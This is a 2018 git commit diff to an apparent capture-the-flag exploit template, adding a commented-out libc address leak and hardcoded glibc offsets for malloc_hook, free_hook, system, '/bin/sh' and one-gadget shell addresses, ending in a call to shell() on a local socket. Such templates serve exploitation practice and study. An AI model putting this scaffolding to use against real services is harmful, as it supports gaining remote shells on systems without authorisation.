bf5ee289a2e6e659358367ab87e9e59e30b442b4
kank3n <k_link_k@yahoo.co.jp>
2018-05-26 18:37:12 +0900

    Update exp_template.py

--- exp_template.py
+++ exp_template.py
@@ -23,26 +23,69 @@ def u(a):
     return struct.unpack("<Q",a)[0]
 
 def main():
-    
+    '''
+    # leak libc
+    read_until(f,"content: ")
+    top_addr = u(f.read(6)+"\x00"*2) 
+    print "top_addr: ",hex(top_addr)
+    libc_base = top_addr - 0x3c4b78
+    print "libc base: ",hex(libc_base)
+    malloc_hook = libc_base + malloc_hook_offset
+    print "malloc_hook: ",hex(malloc_hook)
+    free_hook = libc_base + free_hook_offset
+    print "free_hook: ",hex(free_hook)
+    one_rce = libc_base + one_rce_offset
+    print "one_rce: ",hex(one_rce)
+    _IO_2_1_stderr = libc_base + _IO_2_1_stderr_offset
+    print "_IO_2_1_stderr: ",hex(_IO_2_1_stderr)
+    _IO_2_1_stdin = libc_base + _IO_2_1_stdin_offset
+    print "_IO_2_1_stdin: ",hex(_IO_2_1_stdin)
+    _IO_2_1_stdout = libc_base + _IO_2_1_stdout_offset
+    print "_IO_2_1_stdout: ",hex(_IO_2_1_stdout)
+    global_max_fast = libc_base + global_max_fast_offset
+    print "global_max_fast: ",hex(global_max_fast)
+    _IO_list_all = libc_base + _IO_list_all_offset
+    print "_IO_list_all: ",hex(_IO_list_all)
+    system = libc_base + system_offset
+    print "system: ",hex(system)
+    __libc_start_main = libc_base + __libc_start_main_offset
+    print "__libc_start_main: ",hex(__libc_start_main)
+    binsh = libc_base + binsh_offset
+    print "binsh: ",hex(binsh)
+    '''
+
     shell(s)
 
 if __name__ == '__main__':
     if len(sys.argv) == 2 and sys.argv[1] == '-r':
-        s, f = sock("localhost", 10001)
+        s, f = sock("localhost", 7322)
+        one_rce_offset = 0x4526a
+        #one_rce_offset = 0xf02a4
+        #one_rce_offset = 0xf1147
+        malloc_hook_offset = 0x00000000003c4b10
+        free_hook_offset = 0x00000000003c67a8
+        _IO_2_1_stderr_offset = 0x00000000003c5540
+        _IO_2_1_stdin_offset = 0x00000000003c48e0
+        _IO_2_1_stdout_offset = 0x00000000003c5620
+        global_max_fast_offset = 0x3c67f8
+        _IO_list_all_offset = 0x00000000003c5520
+        system_offset = 0x0000000000045390
+        __libc_start_main_offset = 0x0000000000020740
+        binsh_offset = 0x18cd57
         main()
     else:
-        s, f = sock("localhost", 10001)
-        main()
-        libc_start_offset = 0x0000000000021e50
-        system_offset = 0x0000000000046590
-        binsh_offset = 0x180543
-        one_rce_offset = 0x4647c
-        one_rce_offset = 0xe9415
-        #one_rce_offset = 0xea36d
-        fread_offset = 0x000000000006e7e0
-        stderr_offset = 0x00000000003c31c0
-        stdout_offset = 0x00000000003c3400
-        stdin_offset = 0x00000000003c3640
-        free_hook_offset = 0x00000000003c4a10
-        malloc_hook_offset = 0x00000000003c2740
-        io_list_all_offset = 0x00000000003c31a0
+        s, f = sock("localhost", 7322)
+        one_rce_offset = 0x4526a
+        #one_rce_offset = 0xf02a4
+        #one_rce_offset = 0xf1147
+        malloc_hook_offset = 0x00000000003c4b10
+        free_hook_offset = 0x00000000003c67a8
+        _IO_2_1_stderr_offset = 0x00000000003c5540
+        _IO_2_1_stdin_offset = 0x00000000003c48e0
+        _IO_2_1_stdout_offset = 0x00000000003c5620
+        global_max_fast_offset = 0x3c67f8
+        _IO_list_all_offset = 0x00000000003c5520
+        system_offset = 0x0000000000045390
+        __libc_start_main_offset = 0x0000000000020740
+        binsh_offset = 0x18cd57
+main()
